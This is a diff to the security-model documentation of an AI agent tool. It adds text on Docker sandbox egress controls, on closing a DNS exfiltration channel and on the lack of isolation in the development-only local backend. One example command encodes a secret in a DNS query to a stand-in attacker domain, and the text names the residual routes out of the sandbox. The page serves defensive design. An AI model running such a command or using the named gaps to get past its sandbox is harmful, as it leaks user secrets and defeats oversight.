@@ -1,7 +1,11 @@
 # Security model
 
 The property this page is about: a process that runs agent-authored code never holds a real API key,
-and cannot reach a host nobody allowlisted.
+and — on `terminal.backend: docker`, the default and only sandboxed backend — cannot reach a host
+nobody allowlisted, over any protocol including DNS. This network property is a property of the
+Docker backend: `LocalBackend` ("Local Execution Backend (Development Only)") runs commands on the
+host with the host's own network and is not a sandbox, so nothing on this page isolates its network —
+see "Sandbox execution" and "Offline mode" below.
 
 The closest comparable tool has no equivalent. Hermes has no TLS interception, no CA injection, no
 egress allowlist, and its `docker-compose.yml` runs `network_mode: host` for both services, which
@@ -132,6 +136,22 @@ the allowlist bound only clients that honoured `HTTPS_PROXY`. If the firewall ca
 egress sandbox is not created (fail closed, never a bridge fallback). See the egress-firewall section
 of [terminal.md](terminal.md) and `packages/trent-core/src/terminal/egress-network.ts`.
 
+**DNS is closed too.** `dig`, `nslookup`, `host` and `ping` are deliberately routed into the egress
+seat, which would otherwise leave a DNS-over-UDP exfiltration channel: an agent could encode a secret
+into a query name (`nslookup $(cat secret | base64).attacker.tld`) that Docker's embedded resolver
+(`127.0.0.11`) forwards upstream, walking the data out even though no TCP to the attacker ever
+succeeds. The egress seat is created with `--dns 127.0.0.1`, which pins the embedded resolver's
+upstream to a loopback sinkhole (nothing listens there in the seat), so an external name returns
+SERVFAIL and cannot resolve. This holds by construction, independent of the daemon's per-version
+embedded-resolver policy: measured on Docker Desktop 29.5.3 (2026-09-26) an `--internal` seat's
+resolver already declined to forward external queries (SERVFAIL over `nslookup`, `getent` and a raw
+UDP/53 probe to `127.0.0.11`), but the explicit `--dns` pin also holds on a version whose resolver
+would forward. The seat never needs to resolve an external name itself: `host.docker.internal` is an
+`/etc/hosts` entry consulted before DNS, and a proxied client sends the hostname in the proxy
+`CONNECT`, which the host-side proxy resolves. Residual: this is IPv4 UDP/53 to the embedded resolver;
+raw IPv6 routing and non-DNS UDP (QUIC/STUN) from the seat are bounded by `--internal` having no
+off-network route, not by an application proxy. This whole property is `backend: docker` only.
+
 `LocalBackend` is named "Local Execution Backend (Development Only)" for a reason: it runs commands
 on the host with the host's environment. It is not a sandbox.
 
@@ -154,6 +174,17 @@ dispatcher would not apply to Bun's native `fetch`:
 3. **Tool gates.** The egress sandbox creates no container (there is no allowlisted host to reach),
    the browser toolset is disabled, faster-whisper is refused unless its model is already cached, and
    `trent update` refuses.
+
+**Scope: this is airtight only on `backend: docker`.** Layers 1 and 2 guard Trent's own
+`fetch`-based dials and its config front door on any backend, and layer 3 stands down the egress
+container. But a subprocess Trent spawns through the `terminal` or `code_execution` tool — `curl`,
+`git clone`, `pip install`, `ssh` — is not routed through `trentFetch`. On the Docker backend the
+subprocess is inside the isolated (`--network none`) or the DNS-closed egress seat, so it still
+cannot leave the machine. On `LocalBackend` there is no network namespace and no proxy interposition,
+so `curl https://host` from a tool egresses on the host's own network regardless of `TRENT_OFFLINE`.
+"Nothing may leave the machine" is therefore a `backend: docker` guarantee; on `LocalBackend`
+(development only) offline mode stops Trent's own dials and hosted config, not an agent-run
+subprocess.
 
 `trent security --offline` (and the `check_offline` doctor check) prove it: they enumerate every
 network-capable path from the egress registry (`egress/registry.ts`), dial the RFC 5737 literal
